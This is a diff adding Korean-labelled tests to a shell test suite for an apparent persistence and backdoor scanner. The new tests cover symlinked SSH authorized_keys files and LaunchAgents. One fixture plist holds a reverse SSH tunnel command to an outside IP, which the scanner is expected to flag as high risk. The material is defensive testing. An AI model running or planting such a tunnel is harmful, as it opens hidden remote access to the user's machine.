@@ -131,6 +131,18 @@ expect "시작 프로그램 스크립트의 포트 8099는 MEDIUM" 1 "startup-fo
 mk; mkdir -p "$H/.config/systemd/user"; printf '[Service]\nExecStart=/bin/true\n' > "$H/.config/systemd/user/readme.txt"
 expect "접미사가 다른 파일은 무시" 0 "신호 없음" "" $S --home "$H"
 
+echo "== 심볼릭 링크(dotfiles 관리 도구)"
+mk; mkdir -p "$H/dotfiles" "$H/.ssh"; printf '%s\n' "$KEY1" > "$H/dotfiles/ak"; old "$H/dotfiles/ak"; ln -s "$H/dotfiles/ak" "$H/.ssh/authorized_keys"
+expect "authorized_keys 링크는 MEDIUM authkeys-symlink + 대상 검사" 1 "authkeys-symlink" "[HIGH" $S --home "$H"
+expect "링크 대상의 키도 읽는다" 1 "키 1개" "" $S --home "$H" -v
+mk; mkdir -p "$H/dotfiles" "$H/.ssh"; printf '%s\n' "$KEY1" > "$H/dotfiles/ak"; old "$H/dotfiles/ak"; ln -s "$H/dotfiles/ak" "$H/.ssh/authorized_keys"
+echo "$KEY2" > "$T/known.txt"
+expect "링크 대상의 모르는 키는 HIGH" 2 "authkeys-unknown" "" $S --home "$H" --known-keys "$T/known.txt"
+mk; mkdir -p "$H/.ssh"; ln -s "$T/missing" "$H/.ssh/authorized_keys"
+expect "끊어진 링크도 신호를 남긴다" 1 "authkeys-symlink" "" $S --home "$H"
+mk; mkdir -p "$H/dotfiles" "$H/Library/LaunchAgents"; printf '<plist><string>ssh -N -R 2222:localhost:22 u@203.0.113.7</string></plist>\n' > "$H/dotfiles/t.plist"; old "$H/dotfiles/t.plist"; ln -s "$H/dotfiles/t.plist" "$H/Library/LaunchAgents/com.me.tun.plist"
+expect "LaunchAgent 링크는 MEDIUM launchagent-symlink + 대상 내용 HIGH" 2 "launchagent-symlink" "" $S --home "$H"
+
 echo "== 출력 형식과 안전성"
 mk; ext .cursor anthropic.claude-code-2.1.312 2.1.312
 out="$($S --home "$H" --json)"; rc=$?
